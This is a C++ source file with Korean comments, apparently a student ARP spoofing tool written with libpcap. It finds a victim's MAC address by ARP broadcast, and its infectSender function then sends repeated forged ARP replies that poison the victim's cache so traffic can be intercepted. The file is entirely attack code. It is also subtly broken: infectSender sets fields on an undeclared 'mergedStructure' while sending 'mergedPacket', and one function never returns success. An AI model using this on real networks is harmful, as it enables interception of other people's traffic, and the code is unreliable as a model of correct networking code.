#include <arp.h>
#include <util.h>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>

// getSenderMacAddress()에서 사용되는 모듈함수
int receiveSenderMacAddress(IN pcap_t *handle, IN IpManager senderIpAddress, OUT MacManager &senderMacAddress) {
    int waitCount = 20;

    // sender MAC 주소를 알아내기 위해 브로드캐스팅을 날렸고,
    // 해당 브로드캐스팅을 수신한 sender는 자신의 MAC 주소를 담은 패킷을 송신할 것이다.
    // 그럼 해당 패킷을 캡쳐해 파싱하여 sender MAC 주소를 획득한다.
    while (waitCount--) {
        printf("[*] Finding MAC Address...\n");
        struct pcap_pkthdr* pcapHeader;
        const u_char* packet;
        if (pcap_next_ex(handle, &pcapHeader, &packet) < 0) {
            fprintf(stderr, "Failed receive packet\n");
            return EXIT_FAILURE;
        }

        MergedHeader* mergedPacket = (MergedHeader *)packet;

        switch (ntohs(mergedPacket->ethernetPacket.type)) {
            case ETHERNET_TYPE_ARP: // 0x0806
                if(mergedPacket->arpPacket.senderProtocolAddress == senderIpAddress) {
                    printf("[*] ARP Information\n");
                    printArpPacketInfo(mergedPacket->arpPacket);
                    senderMacAddress = mergedPacket->arpPacket.senderHardwareAddress;
                    printf("\n");
                }
                break;
            default:
                break;
        }

        sleep(1);
    }
}

int getSenderMacAddress(IN pcap_t *handle, IN MacManager targetMacAddress, IN IpManager targetIpAddress, IN IpManager senderIpAddress, OUT MacManager &senderMacAddress) {
    MergedHeader mergedPacket;

    // Setting for ethernet
    mergedPacket.ethernetPacket.sourceMacAddress = targetMacAddress;
    mergedPacket.ethernetPacket.destinationMacAddress.setBroadcast();
    mergedPacket.ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Setting for ARP
    mergedPacket.arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    mergedPacket.arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    mergedPacket.arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    mergedPacket.arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    mergedPacket.arpPacket.operationCode  = htons(ARP_OPERATION_REQUEST);

    // ARP 패킷의 주소를 설정한다.
    mergedPacket.arpPacket.senderHardwareAddress = targetMacAddress;
    mergedPacket.arpPacket.senderProtocolAddress = targetIpAddress;
    mergedPacket.arpPacket.targetHardwareAddress.setBroadcast();
    mergedPacket.arpPacket.targetProtocolAddress = senderIpAddress;

    // sender의 MAC 주소를 알아내기 위한 ARP 패킷 설정이 완료되었으니,
    // 해당 ARP 패킷을 브로드캐스팅한다.
    while (true) {
        printf("[*] Send ARP Packet\n");
        if (pcap_sendpacket(handle, (const u_char *)&mergedPacket, sizeof(mergedPacket))) {
            fprintf(stderr, "Send ARP Packet Error!\n");
            return EXIT_FAILURE;
        }

        printf("[+] Get MAC Address\n");
        if (receiveSenderMacAddress(handle, senderIpAddress, senderMacAddress) == EXIT_SUCCESS) {
            break;
        }
    }

    return EXIT_SUCCESS;
}

// sender를 감염시키기 위한 정보(Local MAC, Sender MAC ...)들을 모두 획득했다면,
// 감염시킬 ARP 패킷을 설정한 후, sender를 감염시킨다.
int infectSender(IN pcap_t *handle, IN MacManager localMacAddress, IN ArpSession arpSession) {
    int count = 30;
    struct in_addr laddr;
    MergedHeader mergedPacket;

    // Setting for ethernet
    mergedPacket.ethernetPacket.sourceMacAddress = localMacAddress;
    mergedPacket.ethernetPacket.destinationMacAddress = arpSession.senderMacAddress;
    mergedPacket.ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Setting for ARP
    mergedStructure.arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    mergedStructure.arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    mergedStructure.arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    mergedStructure.arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    mergedStructure.arpPacket.operationCode  = htons(ARP_OPERATION_REPLY);

    // ARP 패킷의 주소를 설정한다. 
    mergedStructure.arpPacket.senderHardwareAddress = localMacAddress;
    mergedStructure.arpPacket.targetHardwareAddress = arpSession.senderMacAddress;
    mergedStructure.arpPacket.senderProtocolAddress = arpSession.targetIpAddress;
    mergedStructure.arpPacket.targetProtocolAddress = arpSession.senderIpAddress;

    // 감염시키기 위해 사용할 ARP 패킷 설정을 모두 완료했으므로,
    // 해당 패킷을 sender에게 송신한다.
    while (count--) {
        printf("[*] Send ARP Packet...\n");
        if (pcap_sendpacket(handle, (u_char *)&mergedPacket, sizeof(MergedHeader))) {
            fprintf(stderr, "Send ARP Packet Error!\n");
            return EXIT_FAILURE;
        }
        sleep(1);
    }

    return EXIT_SUCCESS;
}